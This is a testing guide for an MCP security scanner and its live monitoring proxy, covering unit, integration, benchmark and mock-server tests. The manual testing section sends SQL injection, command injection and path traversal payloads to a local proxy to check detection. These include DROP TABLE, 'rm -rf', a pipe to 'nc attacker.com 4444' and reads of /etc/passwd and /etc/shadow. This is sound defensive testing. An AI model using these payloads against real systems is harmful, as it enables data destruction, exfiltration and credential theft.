# Testing Guide - MCP Security Scanner

This guide provides detailed instructions for testing all components of the MCP Security Scanner, including unit tests, integration tests, proxy functionality, performance benchmarks, and manual verification procedures.

## Table of Contents

1. [Testing Infrastructure Overview](#testing-infrastructure-overview)
2. [Unit Testing](#unit-testing)
3. [Integration Testing](#integration-testing)
4. [Pattern Performance Testing](#advanced-pattern-performance-testing)
5. [Performance Benchmarking](#performance-benchmarking)
6. [Mock Server Testing](#mock-server-testing)
7. [Live Monitoring Proxy Testing](#live-monitoring-proxy-testing)
8. [Manual Security Testing](#manual-security-testing)
9. [Continuous Integration](#continuous-integration)
10. [Troubleshooting Tests](#troubleshooting-tests)

## Testing Infrastructure Overview

The MCP Security Scanner includes a testing framework covering all aspects of functionality:

### Test Structure
```
/test/
├── unit/                 # Unit tests for core functionality
├── integration/          # End-to-end integration tests  
├── mocks/               # Mock servers and test utilities
├── testdata/            # Test data and fixtures
├── benchmarks/          # Performance benchmarking
├── run_tests.sh         # Main test runner script
├── test_results/        # Generated coverage and reports
└── performance/         # Pattern performance tests
    ├── test_caching_performance.py    # Pattern caching tests
    ├── test_parallel_processing.py    # Worker pool tests
    └── test_weighted_scoring.py       # Scoring tests
```

### Testing Components
- **Unit Tests**: Core scanner functionality and vulnerability detection
- **Integration Tests**: MCP protocol handling and end-to-end scenarios
- **Mock Infrastructure**: HTTP test servers simulating MCP protocol
- **Performance Benchmarks**: Scanning performance and memory profiling
- **Test Data**: Vulnerable code samples and security policies
- **Automated Test Runner**: Test execution with reporting

## Unit Testing

Unit tests validate core scanner functionality with isolated test cases.

### Running Unit Tests

```bash
# Run unit tests with coverage
make test-unit

# Alternative direct execution
go test -v -coverprofile=coverage.out ./test/unit/...

# View test output
cd /Users/gphillips/Desktop/research/dev/mcp-security/mcp-security && make test-unit
# Expected output:
# ok github.com/syphon1c/mcp-security-scanner/test/unit 0.360s
```

### Unit Test Coverage

Current unit tests cover:

**Scanner Functionality**
- `TestNewScanner()` - Scanner initialization and configuration loading
- `TestScanLocalMCPServer_WithVulnerabilities()` - Vulnerability detection accuracy
- `TestScanLocalMCPServer_SafeSamples()` - False positive validation
- `TestScanLocalMCPServer_VulnerabilityMapping()` - Threat categorization

**Test Data Sources**
- **Vulnerable Samples**: 12 categories including SQL injection, command injection, path traversal
- **Safe Samples**: Clean code examples that should not trigger alerts
- **Policy Testing**: Verification of rule engine and pattern matching

### Unit Test Examples

```go
// Example unit test structure
func TestScanLocalMCPServer_WithVulnerabilities(t *testing.T) {
    scanner, err := scanner.NewScanner("../testdata")
    assert.NoError(t, err)
    
    // Create temporary vulnerable files
    tmpDir := createVulnerableTestFiles(t)
    defer os.RemoveAll(tmpDir)
    
    // Execute scan
    result, err := scanner.ScanLocalMCPServer(tmpDir, "test-policy")
    assert.NoError(t, err)
    
    // Validate detection
    assert.Greater(t, result.RiskScore, 0)
    assert.NotEmpty(t, result.Vulnerabilities)
}
```

## Integration Testing

Integration tests validate end-to-end functionality with real MCP server interactions.

### Running Integration Tests

```bash
# Run integration tests
make test-integration

# Direct execution
go test -v ./test/integration/...

# Expected output:
# ok github.com/syphon1c/mcp-security-scanner/test/integration 0.625s
```

### Integration Test Scenarios

**MCP Protocol Testing**
- `TestMCPProtocolIntegration()` - Full protocol handshake and communication
- `TestMCPVulnerabilityDetection()` - End-to-end vulnerability detection
- `TestConcurrentMCPScanning()` - Multiple simultaneous connections

**WebSocket Proxy Testing**
- `TestWebSocketProxyIntegration()` - Complete WebSocket proxy functionality
- `TestWebSocketProxyPerformance()` - Performance validation under load
- `TestWebSocketProxySecurityAnalysis()` - Real-time threat detection

### WebSocket Proxy Testing

The WebSocket proxy functionality includes comprehensive testing capabilities:

```bash
# Run WebSocket integration tests
go test ./test/integration/ -v -run TestWebSocketProxy

# Use automated test script
./test_websocket_proxy.sh
```

**Test Coverage Includes:**
- WebSocket connection establishment and upgrade
- MCP message forwarding and analysis
- Real-time security pattern detection
- Concurrent connection handling
- Performance validation under load
- Error handling and connection cleanup

**Integration Tests:**
Located in `test/integration/websocket_proxy_test.go`, providing:
- Mock WebSocket server setup
- Proxy connection testing
- Message forwarding validation
- Security analysis verification
- Performance benchmarking

**Expected Results:**
- All WebSocket proxy tests should pass
- Performance tests validate handling of 100+ concurrent connections
- Security analysis correctly identifies and blocks malicious patterns

**Mock Server Integration**
- HTTP test servers with configurable MCP responses
- Vulnerable and secure server configurations
- WebSocket and HTTP protocol support

### Integration Test Flow

```bash
# Integration test process:
1. Start mock MCP server (vulnerable/secure variants)
2. Initialize scanner with test policies
3. Execute remote scanning against mock server
4. Validate vulnerability detection and reporting
5. Clean up test environment
```

## Pattern Performance Testing

The polymorphic pattern detection system includes specialized performance and accuracy tests to validate the improvements in v1.2.0.

### Pattern Caching Performance Tests

Test the 55% performance improvement from pattern compilation caching:

```bash
# Run pattern caching performance test
cd /Users/gphillips/Desktop/research/dev/mcp-security/mcp-security
python3 test_caching_performance.py

# Expected output:
# 🧪 Testing Pattern Compilation Caching Performance
# 📁 Created test file: /tmp/test_patterns.py
# 🔄 First run (compilation required): 0.038 seconds
# 🚀 Second run (using cached patterns): 0.017 seconds  
# 📈 Performance Improvement: 55.44%
```

### Weighted Pattern Scoring Tests

Validate scoring algorithms with confidence calculation:

```bash
# Test weighted pattern variants
./mcpscan scan-local test/ advanced-polymorphic-security --verbose

# Verify scoring in output:
# [Critical] Polymorphic Attack Pattern: advanced_command_injection
# Description: Weighted command injection (Weighted Score: 4.50, Confidence: 0.87)
```

### Parallel Processing Tests

Test worker pool performance with large pattern sets:

```bash
# Test with large pattern set to trigger parallel processing
./mcpscan scan-local test/ mcp-advanced-security --verbose

# Monitor for parallel processing messages:
# INFO: Using 8 workers for 15 polymorphic patterns
# INFO: Parallel processing completed in 0.023s
```

### Confidence Scoring Validation

Test confidence calculation accuracy:

```bash
# Run confidence scoring test
go test ./internal/scanner -run TestConfidenceScoring -v

# Example test validation:
# High confidence pattern (0.8+): Critical severity patterns with multiple matches
# Medium confidence (0.5-0.8): Standard patterns with good context
# Low confidence (0.2-0.5): Patterns in comments or string literals
```

## Performance Benchmarking

Performance benchmarks measure scanner efficiency and resource usage.

### Running Benchmarks

```bash
# Execute performance benchmarks
make test-benchmarks

# Direct benchmark execution
go test -bench=. ./test/benchmarks/...

# Expected output:
# BenchmarkLocalScanSmallProject-8      100  12345678 ns/op  1234 B/op  56 allocs/op
# BenchmarkRemoteMCPScan-8             50   23456789 ns/op  2345 B/op  67 allocs/op
# BenchmarkConcurrentScans-8           20   34567890 ns/op  3456 B/op  78 allocs/op
```

### Benchmark Categories

**Local Scanning Performance**
- `BenchmarkLocalScanSmallProject` - Small codebases (< 100 files)
- `BenchmarkLocalScanMediumProject` - Medium codebases (100-1000 files)
- `BenchmarkLocalScanLargeProject` - Large codebases (1000+ files)

**Remote Scanning Performance** 
- `BenchmarkRemoteMCPScan` - Single remote server scanning
- `BenchmarkConcurrentMCPScan` - Multiple simultaneous remote scans
- `BenchmarkMCPProtocolOverhead` - Protocol communication efficiency

**Pattern Matching Performance**
- `BenchmarkRegexPatternMatching` - Security rule pattern matching
- `BenchmarkPolicyEngineEvaluation` - Policy rule processing
- `BenchmarkVulnerabilityClassification` - Threat categorization speed

### Performance Metrics

Benchmark results track:
- **Execution Time**: ns/op (nanoseconds per operation)
- **Memory Allocation**: B/op (bytes allocated per operation) 
- **Allocation Count**: allocs/op (allocations per operation)
- **Throughput**: Operations per second for load testing

## Mock Server Testing

Mock servers provide controlled testing environments with known vulnerabilities.

### Mock Server Features

The test infrastructure includes:

**MockMCPServer Types**
- `NewVulnerableMCPServer()` - Server with intentional security issues
- `NewSecureMCPServer()` - Hardened server for negative testing
- `NewCustomMCPServer()` - Configurable server for specific test scenarios

**Protocol Support**
- Full MCP protocol compliance (`initialize`, `tools/list`, `tools/call`, etc.)
- HTTP and WebSocket transport layers
- Configurable response patterns and vulnerabilities

### Mock Server Usage

```go
// Example mock server setup in tests
func TestWithMockServer(t *testing.T) {
    // Create vulnerable server
    server := mocks.NewVulnerableMCPServer()
    defer server.Close()
    
    // Test scanner against server
    scanner, _ := scanner.NewScanner(".")
    result, err := scanner.ScanRemoteMCPServer(server.URL, "test-policy")
    
    // Validate results
    assert.NoError(t, err)
    assert.Greater(t, len(result.Vulnerabilities), 0)
}
```

## Live Monitoring Proxy Testing

### Test Automation Script

Our test runner executes all test suites with coverage reporting:

```bash
# Run complete test suite
./test/run_tests.sh

# Expected output:
[INFO] Starting MCP Security Scanner test suite...
[INFO] Project root: /path/to/mcp-security
[INFO] Test timeout: 30s
[INFO] Using Go version: 1.21.1
[INFO] Running unit tests...
ok      github.com/syphon1c/mcp-security-scanner/test/unit      0.319s
[SUCCESS] unit tests passed
[INFO] Running integration tests...
ok      github.com/syphon1c/mcp-security-scanner/test/integration       0.454s
[SUCCESS] integration tests passed
[INFO] Generating coverage report...
[SUCCESS] Coverage report generated: test_results/coverage.html
[SUCCESS] All test suites passed! 🎉
```

**Test Script Features**
- Automated dependency management
- Coverage report generation (HTML and text)
- Benchmark execution and reporting
- Colored output for easy reading
- Test result archiving in `test_results/` directory

**Generated Reports**
- `test_results/coverage.html` - Interactive coverage report
- `test_results/test_summary.txt` - Test execution summary
- `test_results/benchmark_results.txt` - Performance benchmark results
- `test_results/coverage.out` - Raw coverage data

The Live Monitoring Proxy provides real-time security monitoring with transparent traffic interception.

### Proxy Test Environment Setup

Prerequisites for proxy testing:

```bash
# Check Go installation  
go version
# Expected: go version go1.21.0 or later

# Check Python installation for mock servers
python3 --version
# Expected: Python 3.8 or later

# Build the scanner with proxy support
go build -o mcpscan
./mcpscan --help | grep proxy
# Expected: proxy command listed in help
```

### Starting Mock Servers for Proxy Testing

```bash
# Start vulnerable mock MCP server
python3 test/mocks/mock-mcp-server.py

# Expected output:
2025-09-01 14:49:13,164 - INFO - Database initialized at /tmp/mock_mcp_test.db
2025-09-01 14:49:13,168 - INFO - Mock MCP Server started in VULNERABLE mode
2025-09-01 14:49:13,169 - INFO - Server: http://localhost:8000

🚀 Mock MCP Server running on http://localhost:8000
Mode: VULNERABLE

Endpoints:
  POST /mcp/initialize
  POST /mcp/tools/list
  POST /mcp/tools/call
  GET  /health
  WS   /ws
```

### Starting the Security Proxy

```bash
# Start proxy monitoring the mock server
./mcpscan proxy http://localhost:8000 9080 critical-security

# Verify proxy is running
curl http://localhost:9080/monitor/health

# Expected response:
{
  "status": "healthy",
  "target": "http://localhost:8000",
  "timestamp": "2025-09-01T10:30:00Z",
  "alerts_queue_size": 0,
  "logs_queue_size": 15,
  "uptime": "2h30m"
}
```

### Test Suite

Run the comprehensive test suite that validates all proxy functionality:

```bash
# Execute comprehensive tests
python3 test/integration/test-proxy-comprehensive.py

# Expected output structure:
🚀 MCP Security Proxy Test Suite
Starting comprehensive testing...
🧪 Starting Proxy Tests
============================================================

🔍 Test 1: Proxy Health Check
   ✅ Proxy health: healthy
   📡 Target: http://localhost:8000

🔍 Test 2: Direct vs Proxied Requests
   ✅ /health: Status codes match (200)
   ✅ /debug/info: Status codes match (200)

🔍 Test 3: Proxy Monitoring Endpoints
   ✅ /monitor/health: Available (142 bytes)
   ✅ /monitor/alerts: Available (62 bytes)
   ✅ /monitor/logs: Available (59 bytes)

🔍 Test 4: Security Detection
   📊 SQL Injection: HTTP 200 (Request intercepted)
   📊 Script Injection: HTTP 200 (Request intercepted)
   📊 Command Injection: HTTP 200 (Request intercepted)

🔍 Test 5: WebSocket Proxy
   ✅ WebSocket proxy: Fully functional with comprehensive test coverage

🔍 Test 6: Load Testing
   📊 Load test: 50/50 requests successful (100.0%)
   ⏱️ Duration: 0.03s (1694.1 req/s)

🔍 Test 7: Error Handling
   📊 Non-existent endpoint: HTTP 404

============================================================
📊 Results: 8 PASS, 0 WARN, 1 FAIL (9 total)
⚠️ Some tests failed, but proxy appears functional.
```

#### Test Success Criteria

- **PASS**: 7+ tests should pass for successful proxy operation
- **WARN**: Warnings are acceptable and don't indicate failure
- **FAIL**: Only WebSocket timeout is acceptable failure in some environments

### Final Verification Demo

Run the final demonstration script for complete verification:

```bash
# Execute final verification
python3 test/integration/proxy-final-demo.py

# Expected output:
🚀 MCP Live Monitoring Proxy - Final Verification
============================================================

🔍 1. Testing Proxy Health and Monitoring
   ✅ Proxy Health: healthy
   📡 Target: http://localhost:8000
   📊 Alerts Queue: 0
   📝 Logs Queue: 15

🔍 2. Testing Request Proxying
   ✅ /health: Status codes match (200)
   ✅ /debug/info: Status codes match (200)

🔍 3. Testing Security Detection
   📊 SQL Injection: HTTP 200 (Request intercepted)
   📊 Path Traversal: HTTP 200 (Request intercepted)
   📊 Command Injection: HTTP 200 (Request intercepted)

🔍 4. Testing Load Performance
   📊 Load test: 20/20 successful (100.0%)
   ⏱️ Duration: 0.03s (579.4 req/s)

🔍 5. Monitoring Endpoints Status
   ✅ /monitor/health: Active (status: healthy)
   ✅ /monitor/alerts: Active (status: ok)
   ✅ /monitor/logs: Active (status: ok)

============================================================
🎉 LIVE MONITORING PROXY STATUS: OPERATIONAL
============================================================

📈 Proxy Features Verified:
   ✅ Request/Response Proxying
   ✅ Security Threat Detection
   ✅ Real-time Monitoring
   ✅ Health Status Reporting
   ✅ Performance Under Load
   ✅ WebSocket Support (Available)

✨ The Live Monitoring Proxy is successfully protecting MCP traffic!
```

## Manual Security Testing

### SQL Injection Testing

Test SQL injection detection capabilities:

```bash
# Test 1: Basic SQL injection
curl -X POST http://localhost:9080/mcp/tools/call \
  -H "Content-Type: application/json" \
  -d '{
    "id": "sql_test_1",
    "jsonrpc": "2.0",
    "method": "tools/call",
    "params": {
      "name": "database_query",
      "arguments": {
        "query": "SELECT * FROM users WHERE id = 1; DROP TABLE users; --"
      }
    }
  }'

# Expected: Request processed, security alert generated
# Check alerts: curl http://localhost:9080/monitor/alerts

# Test 2: Union-based SQL injection
curl -X POST http://localhost:9080/mcp/tools/call \
  -H "Content-Type: application/json" \
  -d '{
    "id": "sql_test_2",
    "jsonrpc": "2.0",
    "method": "tools/call",
    "params": {
      "name": "search",
      "arguments": {
        "query": "test' UNION SELECT username, password FROM admin_users --"
      }
    }
  }'

# Test 3: Boolean-based SQL injection
curl -X POST http://localhost:9080/mcp/tools/call \
  -H "Content-Type: application/json" \
  -d '{
    "id": "sql_test_3",
    "jsonrpc": "2.0",
    "method": "tools/call",
    "params": {
      "name": "login",
      "arguments": {
        "username": "admin' OR '1'='1",
        "password": "anything"
      }
    }
  }'
```

### Command Injection Testing

Test command injection detection:

```bash
# Test 1: Basic command injection
curl -X POST http://localhost:9080/mcp/tools/call \
  -H "Content-Type: application/json" \
  -d '{
    "id": "cmd_test_1",
    "jsonrpc": "2.0",
    "method": "tools/call",
    "params": {
      "name": "system_command",
      "arguments": {
        "command": "ls; rm -rf /tmp/*"
      }
    }
  }'

# Test 2: Command substitution
curl -X POST http://localhost:9080/mcp/tools/call \
  -H "Content-Type: application/json" \
  -d '{
    "id": "cmd_test_2",
    "jsonrpc": "2.0",
    "method": "tools/call",
    "params": {
      "name": "process_file",
      "arguments": {
        "filename": "test.txt; $(whoami)"
      }
    }
  }'

# Test 3: Pipe-based command injection
curl -X POST http://localhost:9080/mcp/tools/call \
  -H "Content-Type: application/json" \
  -d '{
    "id": "cmd_test_3",
    "jsonrpc": "2.0",
    "method": "tools/call",
    "params": {
      "name": "data_export",
      "arguments": {
        "format": "csv | nc attacker.com 4444"
      }
    }
  }'
```

### Path Traversal Testing

Test directory traversal detection:

```bash
# Test 1: Basic path traversal
curl -X POST http://localhost:9080/mcp/tools/call \
  -H "Content-Type: application/json" \
  -d '{
    "id": "path_test_1",
    "jsonrpc": "2.0",
    "method": "tools/call",
    "params": {
      "name": "read_file",
      "arguments": {
        "path": "../../../../etc/passwd"
      }
    }
  }'

# Test 2: URL-encoded traversal
curl -X POST http://localhost:9080/mcp/tools/call \
  -H "Content-Type: application/json" \
  -d '{
    "id": "path_test_2",
    "jsonrpc": "2.0",
    "method": "tools/call",
    "params": {
      "name": "download_file",
      "arguments": {
        "path": "..%2f..%2f..%2fetc%2fshadow"
      }
    }
  }'

# Test 3: Double-encoded traversal
curl -X POST http://localhost:9080/mcp/tools/call \
  -H "Content-Type: application/json" \
  -d '{
    "id": "path_test_3",
    "jsonrpc": "2.0",
    "method": "tools/call",
    "params": {
      "name": "backup_file",
      "arguments": {
        "source": "....//....//....//etc/hosts"
      }
    }
  }'
```

### Verifying Security Alerts

After running security tests, verify that alerts were generated:

```bash
# Check security alerts
curl http://localhost:9080/monitor/alerts | jq .

# Expected output structure:
{
  "status": "ok",
  "message": "Alert endpoint active",
  "alerts": [
    {
      "timestamp": "2025-09-01T10:30:20Z",
      "severity": "High",
      "alertType": "SQL Injection Detected",
      "description": "Potential SQL injection in MCP tool call parameter",
      "source": "127.0.0.1:54321",
      "evidence": "'; DROP TABLE users; --",
      "action": "Monitor"
    }
  ]
}

# Check detailed logs (Note: By default, proxy logs go to stdout/stderr)
# To create proxy.log file, redirect output when starting proxy:
# ./mcpscan proxy http://localhost:8000 9080 critical-security > proxy.log 2>&1 &

# If proxy.log exists (from redirected output):
tail -20 proxy.log | grep "SECURITY ALERT"

# Alternative: Monitor live output in real-time:
# Watch proxy terminal output for security alerts

# Expected log entries (stdout or proxy.log):
2025/09/01 14:57:01 SECURITY ALERT [High]: Suspicious Tool Call - Potential injection attempt
2025/09/01 14:57:01 SECURITY ALERT [High]: Blocked Pattern Detected - Blocks destructive SQL commands
```

## Performance Testing

### Load Testing

Test proxy performance under load:

```bash
# Simple load test with curl
for i in {1..100}; do
  curl -s http://localhost:9080/health > /dev/null &
done
wait

# Monitor proxy performance
curl http://localhost:9080/monitor/health | jq '.requests_processed, .average_response_time, .error_rate'

# Advanced load test with parallel connections
seq 1 50 | xargs -I{} -P 50 curl -s http://localhost:9080/health

# Expected results:
# - 100% success rate
# - Average response time < 100ms
# - Error rate < 1%
```

### Memory and Resource Testing

Monitor resource usage during testing:

```bash
# Monitor proxy process
watch -n 5 "ps aux | grep mcpscan | grep -v grep"

# Expected output:
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
user     12345  1.0  0.5  123456 12345 ?      Sl   10:30   0:01 ./mcpscan proxy

# Monitor system resources
top -p $(pgrep mcpscan)

# Check memory usage over time
while true; do
  ps -o pid,vsz,rss,comm -p $(pgrep mcpscan)
  sleep 30
done
```

### Concurrent Connection Testing

Test proxy with multiple simultaneous connections:

```bash
# Create multiple background connections
for i in {1..20}; do
  (
    while true; do
      curl -s http://localhost:9080/health > /dev/null
      sleep 1
    done
  ) &
done

# Let connections run for 60 seconds
sleep 60

# Kill background processes
jobs -p | xargs kill

# Check proxy health after load
curl http://localhost:9080/monitor/health | jq .
```

## Integration Testing

### SIEM Integration Testing

Test SIEM integration (if configured):

```bash
# Configure SIEM endpoint (example)
export SIEM_ENDPOINT=https://test-siem.company.com/api/events
export SIEM_API_KEY=test-api-key

# Restart proxy with SIEM integration
pkill -f mcpscan
./mcpscan proxy http://localhost:8000 9080 critical-security &

# Generate security event
curl -X POST http://localhost:9080/mcp/tools/call \
  -d '{"params": {"sql": "DROP TABLE users;"}}'

# Check SIEM endpoint received event (if available)
# This would depend on your specific SIEM system
```

### Slack Integration Testing

Test Slack webhook integration (if configured):

```bash
# Configure Slack webhook (example)
export SLACK_WEBHOOK=https://hooks.slack.com/services/test/webhook

# Restart proxy with Slack integration
pkill -f mcpscan
./mcpscan proxy http://localhost:8000 9080 critical-security &

# Generate high-severity alert
curl -X POST http://localhost:9080/mcp/tools/call \
  -d '{"params": {"command": "rm -rf /"}}'

# Check Slack channel for alert notification
```

### WebSocket Testing

Test WebSocket functionality:

```bash
# Test WebSocket connection through proxy
wscat -c ws://localhost:9080/ws

# If wscat is not available, use curl
curl --include \
     --no-buffer \
     --header "Connection: Upgrade" \
     --header "Upgrade: websocket" \
     --header "Sec-WebSocket-Key: SGVsbG8sIHdvcmxkIQ==" \
     --header "Sec-WebSocket-Version: 13" \
     http://localhost:9080/ws

# Test WebSocket message transmission
echo '{"type": "ping", "data": "test"}' | wscat -c ws://localhost:9080/ws
```

## Troubleshooting Tests

### Common Test Failures

#### Test Failure: Connection Refused

```bash
# Problem: Cannot connect to proxy
curl: (7) Failed to connect to localhost port 9080: Connection refused

# Solution 1: Check if proxy is running
ps aux | grep mcpscan

# Solution 2: Restart proxy
./mcpscan proxy http://localhost:8000 9080 critical-security

# Solution 3: Check port availability
lsof -i :9080
```

#### Test Failure: No Security Alerts

```bash
# Problem: Security tests don't generate alerts
curl http://localhost:9080/monitor/alerts
# Returns: {"alerts": []}

# Solution 1: Check security policies
./mcpscan policies

# Solution 2: Verify pattern exists in policy
grep -i "drop table" policies/critical-security.json

# Solution 3: Check alert threshold
grep alertThreshold configs/config.yaml

# Solution 4: Test with known malicious pattern
curl -X POST http://localhost:9080/mcp/tools/call \
  -d '{"params": {"sql": "DROP TABLE users;"}}'
```

#### Test Failure: High Response Times

```bash
# Problem: Proxy response times > 100ms
curl http://localhost:9080/monitor/health | jq .average_response_time

# Solution 1: Check target server performance
curl -w "%{time_total}\n" http://localhost:8000/health

# Solution 2: Monitor system resources
top -p $(pgrep mcpscan)

# Solution 3: Reduce analysis complexity
export PROXY_WORKER_COUNT=5
export PROXY_TIMEOUT=30s

# Solution 4: Check network latency
ping localhost
```

### Debug Mode Testing

Enable debug mode for detailed troubleshooting:

```bash
# Enable debug logging
export LOG_LEVEL=DEBUG
export PROXY_DEBUG=true

# Restart proxy with debug output (logs to stdout by default)
./mcpscan proxy http://localhost:8000 9080 critical-security

# To save logs to file, redirect output:
./mcpscan proxy http://localhost:8000 9080 critical-security > proxy.log 2>&1 &

# Or run in background and monitor logs:
./mcpscan proxy http://localhost:8000 9080 critical-security &
# Logs will appear in terminal. To capture: script -q proxy.log

# Expected debug output:
2025/09/01 14:55:06 DEBUG Proxy request received: POST /mcp/tools/call
2025/09/01 14:55:06 DEBUG Analyzing request body: {"jsonrpc":"2.0",...}
2025/09/01 14:55:06 DEBUG Pattern match result: SQL_INJECTION_001 matched
2025/09/01 14:55:06 DEBUG Security alert generated: severity=High
2025/09/01 14:55:06 DEBUG Request forwarded to target: 200 OK
```

### Test Environment Reset

Reset test environment between test runs:

```bash
# Stop all proxy processes
pkill -f mcpscan

# Clear proxy logs (if redirected to file)
rm -f proxy.log

# Note: By default, proxy logs go to stdout/stderr
# To create proxy.log file, redirect output when starting:
./mcpscan proxy http://localhost:8000 9080 critical-security > proxy.log 2>&1 &

# Verify clean state
curl http://localhost:9080/monitor/health | jq '.alerts_queue_size, .logs_queue_size'
# Expected: {"alerts_queue_size": 0, "logs_queue_size": 0}
```

### Test Report Generation

Generate  test report:

```bash
#!/bin/bash
# test-report.sh

echo "=== MCP Security Proxy Test Report ===" > test-report.txt
echo "Date: $(date)" >> test-report.txt
echo "Environment: $(uname -a)" >> test-report.txt
echo "" >> test-report.txt

echo "1. Proxy Health Check:" >> test-report.txt
curl -s http://localhost:9080/monitor/health | jq . >> test-report.txt
echo "" >> test-report.txt

echo "2. Security Test Results:" >> test-report.txt
python3 test/integration/test-proxy-comprehensive.py >> test-report.txt
echo "" >> test-report.txt

echo "3. Performance Metrics:" >> test-report.txt
curl -s http://localhost:9080/monitor/health | jq '.requests_processed, .average_response_time, .error_rate' >> test-report.txt
echo "" >> test-report.txt

echo "4. Recent Security Alerts:" >> test-report.txt
curl -s http://localhost:9080/monitor/alerts | jq .alerts >> test-report.txt

echo "Test report generated: test-report.txt"
```

This  testing guide ensures thorough validation of the Live Monitoring Proxy functionality, covering all aspects from basic connectivity to advanced security testing and performance validation.
